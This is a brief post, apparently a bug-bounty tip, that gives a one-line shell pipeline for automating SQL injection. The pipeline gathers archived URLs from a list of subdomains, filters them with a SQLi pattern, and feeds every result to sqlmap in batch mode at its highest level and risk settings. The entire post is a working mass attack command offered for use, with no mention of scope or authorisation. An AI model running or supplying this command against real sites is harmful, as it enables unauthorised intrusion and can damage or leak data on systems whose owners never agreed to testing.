automade your sqli findings!👇
```
cat subdomains.txt | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 5 --risk 3
```

